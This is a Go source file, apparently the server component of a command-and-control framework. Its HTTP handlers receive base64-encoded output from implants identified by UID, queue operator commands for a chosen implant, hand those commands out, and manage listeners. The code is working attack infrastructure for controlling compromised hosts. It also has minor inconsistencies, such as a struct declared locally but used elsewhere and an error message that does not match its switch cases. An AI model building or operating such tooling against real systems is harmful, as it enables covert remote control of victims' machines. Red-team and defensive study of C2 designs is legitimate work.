package Server

import (
	"fmt"
	"net/http"
	"encoding/json"
	"encoding/base64"
	"io/ioutil"
	"strconv"
	"bytes"
)

var uid string
var responseChan = make(chan string)


func handleImplant(w http.ResponseWriter, r *http.Request) {

    serializedData := r.Header.Get("Serialized-Data")
    uid = r.Header.Get("UID")
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // Receive response
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    var idMask int
	if uid != "" {
        // Check if the UID exists in the map
        var ok bool
        idMask, ok = ImplantMap[uid]
        if !ok {
            // UID not found in the map, call handleUID function
            handleUID(uid)
            return
        }

		if serializedData != "" {

            type Command struct {
                Group    string `json:"Group"`
                String   string `json:"String"`
                Response string `json:"Response"`
            }

            // Send the response to the operator
            responseChan <- string(serializedData)

			fmt.Fprintf(w, "Command received and processed successfully")

            } else {
                http.Error(w, "No serialized data found in the request", http.StatusBadRequest)
            }
        } else {
            http.Error(w, "No UID found in the request", http.StatusBadRequest)
            return
        }             

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Provide next command to implant
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        if len(commandQueue) != 0 && containsIDMask(idMask) {
            // Retrieve the first command item from the queue
            retrievedCMD := commandQueue[0]

            // Access the commands from retrievedCMD
            commands := retrievedCMD.Commands

            // Assuming you want the first command pair from the commands slice
            if len(commands) != 0 {
                cmdGroup := commands[0][0]
                cmdString := commands[0][1]

                // Create a Command struct for the next command
                nextCommand := Command{
                    Group:    cmdGroup,
                    String:   cmdString,
                    Response: "", 
                }

                // Marshal the Command struct to JSON
                jsonData, err := json.Marshal(nextCommand)
                if err != nil {
                    http.Error(w, "Failed to marshal JSON data", http.StatusInternalServerError)
                    return
                }

                // Base64 encode the JSON data
                base64Data := base64.StdEncoding.EncodeToString(jsonData)

                // Set response headers
                w.Header().Set("Content-Type", "text/plain")
                w.Header().Set("Content-Length", fmt.Sprint(len(base64Data)))
                // Write the response body
                fmt.Fprintf(w, "Serialized-Data: %s", base64Data)

                // Remove the processed command pair from the queue
                commandQueue = commandQueue[1:]
            }
    }
}

func handleOperator(w http.ResponseWriter, r *http.Request) {
    // Only allow POST requests
    // operatorID := r.Header.Get("Operator-ID")

    implantIDStr := r.Header.Get("Implant-ID")

    implantID, err := strconv.Atoi(implantIDStr)
    if err != nil {
        // Handle error if conversion fails
        http.Error(w, "Invalid Implant-ID", http.StatusBadRequest)
        return
    }

    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Receive operator request        
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Read request body
    requestBody, err := ioutil.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "Failed to read request body", http.StatusInternalServerError)
        return
    }

    // Decode base64 data
    decodedData, err := base64.StdEncoding.DecodeString(string(requestBody))
    if err != nil {
        http.Error(w, "Failed to decode base64 data", http.StatusInternalServerError)
        return
    }

    // Unmarshal JSON data
    var command Command
    err = json.Unmarshal(decodedData, &command)
    if err != nil {
        http.Error(w, "Failed to unmarshal JSON data", http.StatusInternalServerError)
        return
    }

    // Add the command to the commandQueue
//    commandQueue = append(commandQueue, []string{command.Group, command.String}) // These work forsure
    addToCommandQueue([][]string{{command.Group, command.String}}, implantID)

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            // Respond to operator        
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Wait for the response from the implant
    response := <-responseChan

    // Write the response back to the client
    w.Header().Set("Content-Type", "text/plain")
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Data: %s", response)

}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Server Commands
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
var serverresp []string
func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
    var receivestruct Command
    respChan := make(chan string)

    // Read the request body
    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
        http.Error(w, fmt.Sprintf("Failed to read request body: %s", err), http.StatusBadRequest)
        return
    }

    // Base64 decode the request body
    decodedData, err := base64.StdEncoding.DecodeString(string(body))
    if err != nil {
        http.Error(w, fmt.Sprintf("Failed to decode base64 data: %s", err), http.StatusBadRequest)
        return
    }

    // Trim leading and trailing whitespace
    decodedData = bytes.TrimSpace(decodedData)
   
    err = json.Unmarshal(decodedData, &receivestruct)
    if err != nil {
        return
    }

    
    cmdGroup := receivestruct.Group
    cmdString := receivestruct.String

    switch cmdGroup {
    case "listener":
        createListener(cmdString, respChan)
    case "log":
        updateConnections()
    default:
        fmt.Print(red)
        fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
        fmt.Print(reset)
    }
    

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            // Respond to operator        
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    respStr := <-respChan

    // Update the response structure with command response
    receivestruct.Response = respStr


    jsonBytes, err := json.Marshal(receivestruct)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    // Encode the JSON as base64
    response := base64.StdEncoding.EncodeToString(jsonBytes)

    w.Header().Set("Content-Type", "text/plain")
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Data: %s", response)
}
